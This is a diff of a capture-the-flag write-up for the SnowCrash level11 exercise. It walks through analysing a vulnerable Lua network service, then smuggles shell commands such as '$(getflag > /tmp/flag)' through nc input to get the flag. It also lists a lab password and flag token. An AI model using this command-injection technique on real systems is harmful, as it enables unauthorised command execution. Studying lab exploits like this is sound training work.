@@ -1,27 +1,34 @@
-🔻 Analyze
-⬇️ cat level11.lua
-⬇️ la -la /tmp/level11.lua
-⬇️ ps -aux | grep level11
-👉 lua /home/user/level11/level11.lua
++ ---- 🔻 Analyze ----
+|
+|   cat level11.lua
+|   la -la /tmp/level11.lua
+|   ps -aux | grep level11
+|   👉 lua /home/user/level11/level11.lua
+|
+|   cp level11.lua /tmp
+|   change (with vim) line in /tmp/level11.lua 👉 local server = assert(socket.bind("127.0.0.1", 5251))
+|
+|   lua /tmp/level11.lua > /tmp/output &
+|   curl http://127.0.0.1:5251/word
+|   cat /tmp/output
+|   👉 trying GET /word HTTP/1.1
+|
+|   nc localhost 5251
+|   $(pwd > /tmp/test)
+|   cat /tmp/test
+|   👉 /home/user/level11
+|
+|   kill %1
+|   jobs
+|
 
-⬇️ cp level11.lua /tmp
-⬇️ change (with vim) line in /tmp/level11.lua 👉 local server = assert(socket.bind("127.0.0.1", 5251))
 
-⬇️ lua /tmp/level11.lua > /tmp/output &
-⬇️ curl http://127.0.0.1:5251/word
-⬇️ cat /tmp/output
-👉 trying GET /word HTTP/1.1
-
-⬇️ nc localhost 5251
-⬇️ $(pwd > /tmp/test)
-⬇️ cat /tmp/test
-👉 /home/user/level11
-
-⬇️ kill %1
-⬇️ jobs
-
-🔻 Hack
-⬇️ nc localhost 5151
-⬇️ $(getflag > /tmp/flag)
-⬇️ cat /tmp/flag
-👉 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
++ ---- 🔻 Hack ----
+|
+|   ssh level11@$SNOW_CRASH_IP -p 4242
+|   └ feulo4b72j7edeahuete3no7c
+|   nc localhost 5151
+|   $(getflag > /tmp/flag)
+|   cat /tmp/flag
+|   👉 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+|   
